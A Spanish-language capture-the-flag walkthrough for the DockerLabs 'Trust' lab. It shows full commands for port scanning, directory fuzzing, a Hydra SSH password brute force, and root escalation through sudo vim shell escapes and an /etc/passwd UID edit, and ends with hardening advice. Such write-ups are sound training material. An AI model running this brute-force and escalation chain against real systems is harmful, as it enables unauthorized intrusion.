# 🚀 Explotación de Máquina Trust (DOCKERLABS)

![Nivel: Fácil](https://img.shields.io/badge/Nivel-Fácil-green) ![Tema: Web Enumeration + SSH Brute Force + Sudo Exploitation](https://img.shields.io/badge/Tema-Web%20Enumeration%20%2B%20SSH%20Brute%20Force%20%2B%20Sudo%20Exploitation-blue)

## **Descripción**
Este documento detalla la explotación completa de la máquina **Trust** de DOCKERLABS, que incluye:
1. Enumeración web y descubrimiento de información sensible
2. Fuerza bruta SSH con Hydra
3. Escalada de privilegios mediante abuso de permisos sudo en Vim

**Tiempo estimado**: 30-45 minutos  
**Dificultad**: Fácil  
**Entorno**: Docker container

## **Índice**
1. [Reconocimiento](#reconocimiento)
2. [Enumeración Web](#enumeración-web)
3. [Fuerza Bruta SSH](#fuerza-bruta-ssh)
4. [Acceso Inicial](#acceso-inicial)
5. [Escalada de Privilegios](#escalada-de-privilegios)
6. [Conclusión](#conclusión)

## **Reconocimiento**

### 1. Escaneo de Puertos
```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.18.0.2 -oN scan.txt
```

**Resultados**:
- **Puerto 22/tcp**: SSH - OpenSSH
- **Puerto 80/tcp**: HTTP - Servidor web

**Técnicas aplicadas**:
- **Syn Scan (-sS)**: Escaneo sigiloso
- **Scripting (-sC)**: Ejecución de scripts por defecto
- **Version Detection (-sV)**: Detección de versiones de servicios
- **Output (-oN)**: Exportación de resultados a archivo

## **Enumeración Web**

### 2. Fuzzing de Directorios
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.18.0.2 -x .php,.sh,.py,.txt
```

**Parámetros utilizados**:
- `-w`: Wordlist para fuerza bruta
- `-u`: URL objetivo
- `-x`: Extensiones a buscar

**Hallazgo crítico**:
- **/secrets.php**: Archivo expuesto con información sensible

### 3. Información Obtenida
**Contenido de secrets.php**:
- Nombre de usuario: **mario**
- Posibles credenciales o información adicional

## **Fuerza Bruta SSH**

### 4. Ataque con Hydra
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 ssh://172.18.0.2
```

**Parámetros detallados**:
- `-l mario`: Usuario específico encontrado
- `-P rockyou.txt`: Wordlist de contraseñas
- `-vV`: Verbose muy detallado
- `-f`: Parar al encontrar la primera contraseña válida
- `-t 4`: 4 tareas paralelas para mayor velocidad

**Resultado**: Contraseña comprometida exitosamente

## **Acceso Inicial**

### 5. Conexión SSH
```bash
ssh mario@172.18.0.2
```

**Verificación de acceso**:
```bash
whoami
id
pwd
```

### 6. Flag de Usuario
```bash
find / -name user.txt -o -name flag.txt 2>/dev/null
cat /home/mario/user.txt
```

## **Escalada de Privilegios**

### 7. Enumeración de Permisos Sudo
```bash
sudo -l
```

**Resultado**:
```
User mario may run the following commands on trust:
    (root) /usr/bin/vim
```

### 8. Explotación de Vim
**Método 1: Ejecución directa de shell**
```bash
sudo /usr/bin/vim -c ':! /bin/sh'
```

**Método 2: Escalada desde dentro de Vim**
```bash
sudo vim
# Dentro de Vim:
:shell
# o
:!bash
```

**Método 3: Creación de archivo con privilegios**
```bash
sudo vim /etc/passwd
# Modificar UID de usuario mario a 0
```

### 9. Obtención de Shell Root
**Verificación de privilegios**:
```bash
whoami
# root
id
# uid=0(root) gid=0(root) grupos=0(root)
```

### 10. Flag de Root
```bash
find / -name root.txt -o -name proof.txt 2>/dev/null
cat /root/root.txt
```

## **Conclusión**

### ⚠️ **Vulnerabilidades Críticas Identificadas**
1. **Exposición de información sensible** en secrets.php
2. **Contraseña débil** del usuario mario
3. **Permisos sudo peligrosos** en editor Vim

### 🛡️ **Medidas de Hardening Recomendadas**
- **Protección de archivos sensibles**: Restringir acceso a secrets.php
- **Políticas de contraseñas**: Implementar contraseñas robustas
- **Restricción de permisos sudo**: Limitar ejecución de editores con privilegios
- **Monitoreo de logs**: Auditar intentos de acceso SSH

### 🔧 **Técnicas de Explotación Aplicadas**
1. **Enumeración web** con Gobuster
2. **Fuerza bruta dirigida** con Hydra
3. **Abuso de permisos sudo** en Vim
4. **Escalada clásica** mediante editores privilegiados

---

**Herramientas Utilizadas**:
- `nmap` - Escaneo de puertos y servicios
- `gobuster` - Fuzzing de directorios web
- `hydra` - Fuerza bruta SSH
- `ssh` - Conexión remota
- `vim` - Editor para escalada de privilegios

**Referencias**:
- [GTFOBins - Vim Sudo Exploitation](https://gtfobins.github.io/gtfobins/vim/#sudo)
- [Hydra SSH Brute Force](https://github.com/vanhauser-thc/thc-hydra)
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

**Tags**: `#DOCKERLABS #Trust #SSH #Hydra #Vim #Sudo #PrivEsc #Docker`

---

## **Lecciones Aprendidas**

### 📋 **Para Pentesters**:
- La enumeración web puede revelar información crítica
- Las contraseñas débiles son vectores comunes de ataque
- Los editores con permisos sudo son riesgos de seguridad significativos

### 🎯 **Para Administradores**:
- Revisar regularmente los permisos sudo de los usuarios
- Implementar autenticación de dos factores para SSH
- Realizar auditorías periódicas de archivos expuestos

## **Comandos Críticos de Explotación**

### Reconocimiento
```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.18.0.2
```

### Enumeración Web
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://172.18.0.2 -x .php,.sh,.py,.txt
```

### Fuerza Bruta SSH
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 ssh://172.18.0.2
```

### Escalada de Privilegios
```bash
sudo /usr/bin/vim -c ':! /bin/sh'
```

### Búsqueda de Flags
```bash
find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat
```
